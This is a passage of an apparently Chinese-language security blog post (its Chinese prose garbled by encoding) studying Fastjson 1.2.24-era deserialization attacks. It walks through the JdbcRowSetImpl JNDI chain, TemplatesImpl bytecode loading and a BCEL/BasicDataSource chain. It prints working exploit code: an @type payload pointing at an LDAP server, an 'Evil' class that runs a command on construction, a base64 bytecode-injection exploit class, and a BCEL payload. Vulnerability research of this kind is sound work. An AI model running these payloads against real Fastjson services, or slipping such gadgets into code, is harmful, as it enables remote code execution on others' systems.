class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMap</span><span class="hljs-params">(String map)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setMap&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMap</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getMap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//è¿™ç§æ–¹æ³•ä¼šè°ƒç”¨getå’Œsetæ–¹æ³•</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;,\&quot;map\&quot;:\&quot;ceshi\&quot;&#125;&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">javaObject</span> <span class="hljs-operator">=</span> obj.toJavaObject(Student.class); <span class="hljs-comment">//åªä¼ ä¸€ä¸ªå‚æ•°åªè¿”å›JSONObjectç±»å‹ï¼Œå¯ä»¥è¿™æ ·è½¬æ¢</span><br>        <span class="hljs-comment">//System.out.println(javaObject.getName() + &quot; &quot; + javaObject.getAge()+ &quot; &quot; + javaObject.getMap());</span><br>        System.out.println(<span class="hljs-string">&quot;------------------&quot;</span>);<br>        <span class="hljs-comment">//è¿™ç§æ–¹æ³•åªè°ƒç”¨setæ–¹æ³•</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408282208338.png" alt="image-20240828220804265"></p><p>å¯ä»¥çœ‹åˆ°è½¬æ¢çš„æ—¶å€™ä¼šå†ä¸€æ¬¡è°ƒç”¨setæ–¹æ³•ï¼Œè€Œä¸”æ³¨æ„è¿™é‡Œçš„mapå±æ€§æˆ‘æ˜¯æ²¡æœ‰å®šä¹‰çš„ï¼Œä½†è¦æ˜¯æˆ‘çš„jsonå­—ç¬¦ä¸²é‡Œæœ‰mapå±æ€§ä¹Ÿä¼šè°ƒç”¨å¯¹åº”çš„æ–¹æ³•ï¼Œä¸è¿‡å¯¹åº”çš„javaå¯¹è±¡getå›æ¥çš„å±æ€§å€¼å°±ä¸ºnull</p><p>è¿™é‡Œcopyä¸€ä¸‹y4âœŒçš„æ€»ç»“ï¼š<a href="https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md">https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md</a></p><ul><li>å½“ååºåˆ—åŒ–ä¸º<code>JSON.parseObject(*)</code>å½¢å¼å³æœªæŒ‡å®šclassæ—¶ï¼Œä¼šè°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€æ‰€æœ‰å±æ€§çš„getteræ–¹æ³•ã€JSONé‡Œé¢çš„éç§æœ‰å±æ€§çš„setteræ–¹æ³•ï¼Œå…¶ä¸­propertieså±æ€§çš„getteræ–¹æ³•ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼›</li><li>å½“ååºåˆ—åŒ–ä¸º<code>JSON.parseObject(*,*.class)</code>å½¢å¼å³æŒ‡å®šclassæ—¶ï¼Œåªè°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€JSONé‡Œé¢çš„éç§æœ‰å±æ€§çš„setteræ–¹æ³•ã€propertieså±æ€§çš„getteræ–¹æ³•ï¼›</li><li>å½“ååºåˆ—åŒ–ä¸º<code>JSON.parseObject(*)</code>å½¢å¼å³æœªæŒ‡å®šclassè¿›è¡Œååºåˆ—åŒ–æ—¶å¾—åˆ°çš„éƒ½æ˜¯JSONObjectç±»å¯¹è±¡ï¼Œè€Œåªè¦æŒ‡å®šäº†classå³<code>JSON.parseObject(*,*.class)</code>å½¢å¼å¾—åˆ°çš„éƒ½æ˜¯ç‰¹å®šçš„Studentç±»ï¼›</li></ul><blockquote><p>è¿˜æœ‰æºç çš„è°ƒç”¨åˆ†æä¸å†™äº†å¤ªè‡­å¤ªé•¿äº†ï¼Œçœ‹ç»„é•¿çš„è§†é¢‘å·²ç»è¦æ™•äº†ï¼Œåé¢çœ‹é“¾å­çš„æ—¶å€™ç©¿æ’ç€åˆ†æå§</p></blockquote><p>è¿™é‡Œè¿˜æœ‰ä¸€å¼ è°ƒç”¨ç±»çš„å…³ç³»å›¾</p><p><img src="https://cdn.clown2024.cn/202408282214028.png" alt="1"></p><blockquote><p>JSONï¼šé—¨é¢ç±»ï¼Œæä¾›å…¥å£</p><p>DefaultJSONParserï¼šä¸»ç±»</p><p>ParserConfigï¼šé…ç½®ç›¸å…³ç±»</p><p>JSONLexerBaseï¼šå­—ç¬¦åˆ†æç±»</p><p>JavaBeanDeserializerï¼šJavaBeanååºåˆ—åŒ–ç±»</p></blockquote><p>fastjsonçš„åˆ©ç”¨çš„å…¥å£ç‚¹å°±æ˜¯å¯¹åº”çš„setæˆ–getæ–¹æ³•çš„é“¾å­</p><h1 id="fastjson122-124-jndi"><a href="#Fastjson1-22-1-24-JNDI" class="headerlink" title="Fastjson1.22-1.24 JNDI"></a>Fastjson1.22-1.24 JNDI</h1><h2 id="åŸºäºjdbcrowsetimplçš„åˆ©ç”¨é“¾"><a href="#åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾" class="headerlink" title="åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾"></a>åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾</h2><p>ä»–çš„è§¦å‘ç‚¹åœ¨**JdbcRowSetImpl#connect()**é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202408291556886.png" alt="image-20240829155500981"></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/mQAZldWR\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;<br>JSON.parse(payload);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408291630333.png" alt="image-20240829163040221"></p><blockquote><p>è¿™é‡Œpayloadç”¨parseæˆ–è€…parseObjectéƒ½èƒ½è§¦å‘</p><p>è¿™é‡Œè¿˜å­¦åˆ°äº†ç”¨yakitç›´æ¥æ­å»ºJNDIæœåŠ¡å™¨ï¼Œç‰¹åˆ«æ–¹ä¾¿</p><p><img src="https://cdn.clown2024.cn/202408291629022.png" alt="image-20240829162951907"></p><p>é…ç½®ä¸€ä¸‹payloadå°±èƒ½ç›´æ¥ç”¨äº†</p></blockquote><p>çœ‹ä¸€ä¸‹åˆ©ç”¨é“¾è¿‡ç¨‹å§ï¼Œè¿™æ˜¯ä»setæ–¹æ³•æ‰“çš„ï¼Œæ ¹æ®payloadæˆ‘ä»¬å»çœ‹ä¸€ä¸‹setAutoCommitæ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬è®¾ç½®äº†autoCommitå±æ€§ä»–å°±ä¼šèµ°åˆ°è¿™</p><p><img src="https://cdn.clown2024.cn/202408291726876.png" alt="image-20240829172622802"></p><p>è¿™é‡Œconnä¸€å¼€å§‹ä¸ºç©ºå°±ä¼šèµ°åˆ°connect()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408291730922.png" alt="image-20240829173035857"></p><p><img src="https://cdn.clown2024.cn/202408291730868.png" alt="image-20240829173051811"></p><p>ç„¶åæˆ‘ä»¬payloadé‡Œé¢æ§åˆ¶äº†ä¸€ä¸‹dataSourceå±æ€§å€¼ä¸ºæ¶æ„ldapæœåŠ¡å™¨å³å¯</p><p><strong>è°ƒè¯•ä¸€ä¸‹æ‰§è¡Œæµç¨‹</strong></p><p>å…¶å®å°±æ˜¯èµ°ä¸€ä¸‹å‰é¢æ²¡åˆ†æçš„ååºåˆ—åŒ–çš„è¿‡ç¨‹é¡ºä¾¿è°ƒä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408291632353.png" alt="image-20240829163154441"></p><p>å› ä¸ºè¦åˆ°toJSONæ–¹æ³•æ‰ä¼šè°ƒç”¨getæ–¹æ³•ï¼Œå‰é¢ç›´æ¥åˆ°parseè°ƒç”¨setæ–¹æ³•è§¦å‘æ›´å®¹æ˜“æ»¡è¶³æ¡ä»¶</p><p>ä¸€è·¯è·Ÿè¿›åˆ°è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/202408291705004.png" alt="image-20240829170515929"></p><p>è·å–ä¸€ä¸ªååºåˆ—åŒ–å™¨ï¼Œç„¶åç»§ç»­å¾€é‡Œè·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202408291700828.png" alt="image-20240829170031726"></p><p>è¿™é‡Œå»ºç«‹ä¸€ä¸ªJavaBeanInfoç±»ï¼Œé‡Œé¢å°±è¿›è¡Œäº†å¯¹è¯¥ç±»çš„å„ç§å­—æ®µå’Œæ–¹æ³•è¿˜æœ‰æ„é€ å™¨çš„å°è£…ç­‰ï¼Œåé¢æœ‰é“¾å­éœ€è¦åˆ©ç”¨åˆ°å†è¯¦ç»†è¯´</p><p><img src="https://cdn.clown2024.cn/202408291649160.png" alt="image-20240829164912083"></p><p>ç„¶åç»§ç»­è·Ÿè¿›åˆ°æ‰§è¡Œlookupçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202408291719865.png" alt="image-20240829171913782"></p><p>è¿™é‡Œçš„getDataSourceName()æˆ‘ä»¬å¯ä»¥æ§åˆ¶</p><p><img src="https://cdn.clown2024.cn/202408291719522.png" alt="image-20240829171950465"></p><p>ç„¶åæˆåŠŸå¼¹è®¡ç®—å™¨ã€‚</p><p>ä¸è¿‡jndiçš„æ‰“æ³•æœ‰ç‰ˆæœ¬é™åˆ¶ã€ä¾èµ–é™åˆ¶ä»¥åŠè¦å‡ºç½‘</p><h1 id="fastjson122-124-templatesimpl"><a href="#Fastjson1-22-1-24-TemplatesImpl" class="headerlink" title="Fastjson1.22-1.24 TemplatesImpl"></a>Fastjson1.22-1.24 TemplatesImpl</h1><p><strong>é™åˆ¶</strong></p><p>è¯¥åˆ©ç”¨é“¾éœ€è¦è®¾ç½®<code>Feature.SupportNonPublicField</code>æ‰èƒ½æˆåŠŸè§¦å‘</p><p><strong>åˆ©ç”¨ä»£ç </strong></p><p>å†™ä¸€ä¸ªæ¶æ„ç±»ç»§æ‰¿<strong>AbstractTranslet</strong> </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Evil</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†å†™ä¸€ä¸ªexp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +<br>                    <span class="hljs-string">&quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ</p><p><img src="https://cdn.clown2024.cn/202408301123547.png" alt="image-20240830112259389"></p><p><strong>è°ƒç”¨æµç¨‹åˆ†æ</strong></p><p>Fastjsoné»˜è®¤åªä¼šååºåˆ—åŒ–publicä¿®é¥°çš„å±æ€§ï¼ŒoutputPropertieså’Œ_bytecodesç”±privateä¿®é¥°ï¼Œå¿…é¡»åŠ å…¥<code>Feature.SupportNonPublicField</code>åœ¨parseObjectä¸­æ‰èƒ½è§¦å‘</p><p>ç°åœ¨parseObjectä¸‹æ–­ç‚¹ï¼Œç„¶åè·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202408301652896.png" alt="image-20240830165233826"></p><p>ç»§ç»­è·Ÿè¿›è¿™ä¸ªDefaultJSONParseræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408301658846.png" alt="image-20240830165823736"></p><p>è¿™é‡Œtokenèµ‹çš„å€¼ä¸º12ï¼Œå…ˆè®°ä½</p><p><img src="https://cdn.clown2024.cn/202408301700254.png" alt="image-20240830170035160"></p><p>ç„¶åç»§ç»­è·Ÿè¿›parseObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408301704915.png" alt="image-20240830170443834"></p><p>ä¸€è·¯è·Ÿè¿›åˆ°DefaultJSONParserçš„parseæ–¹æ³•ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301706899.png" alt="image-20240830170659818"></p><p>ç„¶åæ ¹æ®tokenä¸º12ä»£è¡¨â€{â€œåˆ¤æ–­åˆ°è¿™ï¼Œæˆ‘ä»¬è·Ÿè¿›parseObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408301709246.png" alt="image-20240830170954179"></p><p>è¿›åˆ°è¿™é‡Œéå†lexerçš„textå±æ€§é‡Œæˆ‘ä»¬ä¼ çš„jsonå­—ç¬¦ä¸²ï¼Œä¸€å¼€å§‹æ‰«æåˆ°â€™â€â€˜å­—ç¬¦</p><p>ç„¶åå°±èµ°åˆ°ä¸‹é¢è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/202408301713804.png" alt="image-20240830171321736"></p><p>ç„¶åå–å¾—keyä¸º@type</p><p><img src="https://cdn.clown2024.cn/202408301715496.png" alt="image-20240830171538418"></p><p>ç„¶åç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301720580.png" alt="image-20240830172002493"></p><p>è¿™é‡Œçš„DEFAULT_TYPE_KEYå°±æ˜¯@typeï¼Œç„¶åè°ƒç”¨scanSymbol()è·å–åˆ°äº†@typeå¯¹åº”çš„æŒ‡å®šç±»<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ï¼Œå¹¶è°ƒç”¨TypeUtils.loadClass()å‡½æ•°åŠ è½½è¯¥ç±»</p><p>ç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301723344.png" alt="image-20240830172310261"></p><p>è¿™é‡Œå¯¹ç±»åè¿›è¡Œäº†åˆ¤æ–­ï¼Œæ¶‰åŠåˆ°åé¢æ–°ç‰ˆæœ¬ç»•è¿‡é»‘åå•çš„æ–¹æ³•å…ˆç•™æ„ä¸€ä¸‹</p><p>ç°åœ¨ç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301725620.png" alt="image-20240830172504533"></p><p>è¿™é‡Œé€šè¿‡AppClassLoaderåŠ è½½åputåˆ°mappingsé‡Œé¢</p><p>è¿”å›åï¼Œç¨‹åºç»§ç»­å›åˆ°<code>DefaultJSONParser.parseObject()</code>ä¸­å¾€ä¸‹æ‰§è¡Œï¼Œåœ¨æœ€åè°ƒç”¨<code>JavaBeanDeserializer.deserialze()</code>å¯¹ç›®æ ‡ç±»è¿›è¡Œååºåˆ—åŒ–</p><p><img src="https://cdn.clown2024.cn/202408301727881.png" alt="image-20240830172750780"></p><p><strong>å…³é”®åˆ©ç”¨é“¾</strong></p><p>æ¥æ ¹æ®payloadçœ‹ä¸€ä¸‹å…³é”®çš„å±æ€§å¯¹åº”çš„setå’Œgetæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +<br>                    &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; +<br>                    &quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“fastjsonçš„JSON.parseObjectä¼šè°ƒç”¨getå’Œsetæ–¹æ³•ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯TemplatesImplçš„getæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408302131055.png" alt="image-20240830213116051"></p><p>ç„¶ååé¢å…¶å®å°±æ˜¯ccé“¾çš„åŠ¨æ€ç±»åŠ è½½éƒ¨åˆ†ï¼Œé“¾å­å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl#newTransformer()-&gt;TemplatesImpl#getTransletInstance()-&gt;TemplatesImpl#defineTransletClasses()-&gt;defineClass<br></code></pre></td></tr></table></figure><p>ç„¶åå›å¿†ä¸€ä¸‹æœ‰äº›åœ°æ–¹ä¸ºä»€ä¹ˆè¦èµ‹å€¼</p><p><img src="https://cdn.clown2024.cn/202408302145512.png" alt="image-20240830214556445"></p><p>è¿™é‡Œ_tfactoryè¦è°ƒç”¨æ–¹æ³•æ‰€ä»¥ä¸èƒ½ä¸ºç©ºè¦èµ‹å€¼</p><p><img src="https://cdn.clown2024.cn/202408302146869.png" alt="image-20240830214643793"></p><p>è¿™é‡Œè¦è°ƒç”¨defineTransletClasses()æ–¹æ³•æ‰€ä»¥_name!&#x3D;nullï¼Œ_class&#x3D;&#x3D;nullåé¢å°±æ²¡æœ‰äº†</p><blockquote><p>è¿™é‡Œy4å¸ˆå‚…çš„payloadè¿˜å¸¦äº†ä¸€ä¸ªversionæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘å»æ‰äº†ä¹Ÿæ˜¯èƒ½å¤Ÿæ­£å¸¸å¼¹è®¡ç®—å™¨çš„</p></blockquote><p><strong>base64</strong></p><p>å†çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆéœ€è¦å°†å­—èŠ‚ç è¿›è¡Œbase64å¤„ç†</p><p>è¿™æ˜¯å› ä¸ºFastJsonæå–byte[]æ•°ç»„å­—æ®µå€¼æ—¶ä¼šè¿›è¡ŒBase64è§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ payloadæ—¶éœ€è¦å¯¹ <code>_bytecodes</code> è¿›è¡ŒBase64å¤„ç†</p><p><img src="https://cdn.clown2024.cn/202408302203171.png" alt="image-20240830220348083"></p><p><img src="https://cdn.clown2024.cn/202408302204473.png" alt="image-20240830220404414"></p><p><strong>å…³äºä¸‹åˆ’çº¿çš„å¤„ç†</strong></p><p><img src="https://cdn.clown2024.cn/202408302206839.png" alt="image-20240830220656753"></p><p>æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹çš„smartMatchå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202408302207795.png" alt="image-20240830220749721"></p><p>ç„¶ååœ¨è¿™é‡Œå°†ä¸‹åˆ’çº¿è¿›è¡Œäº†æ›¿æ¢</p><h1 id="fastjson1115-1224ä¸bcelå­—èŠ‚ç åŠ è½½"><a href="#Fastjson1-1-15-1-2-24ä¸BCELå­—èŠ‚ç åŠ è½½" class="headerlink" title="Fastjson1.1.15-1.2.24ä¸BCELå­—èŠ‚ç åŠ è½½"></a>Fastjson1.1.15-1.2.24ä¸BCELå­—èŠ‚ç åŠ è½½</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoaderå»å“ªäº† | ç¦»åˆ«æ­Œ (leavesongs.com)</a>ï¼Œ<a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">JavaåŠ¨æ€ç±»åŠ è½½ï¼Œå½“FastJsoné‡åˆ°å†…ç½‘ â€“ KINGX</a></p><p>è¿™ç§å’Œä¸Šé¢çš„TemplatesImplé“¾å­æ‰“æ³•éƒ½å¯ä»¥ç”¨äºä¸å‡ºç½‘çš„æ‰“æ³•ï¼Œä¸è¿‡æ¯”TemplatesImplåˆ©ç”¨æ›´å¹¿æ³›ä¸€ç‚¹</p><p>è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆç»™å‡ºåªç”¨parseå°±èƒ½è§¦å‘çš„payloadå½¢å¼</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//è¿™ä¸ªå¯æœ‰å¯æ— éƒ½ä¸å½±å“</span><br>        <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ä»£ç ï¼š</p><p>Evil.java</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span 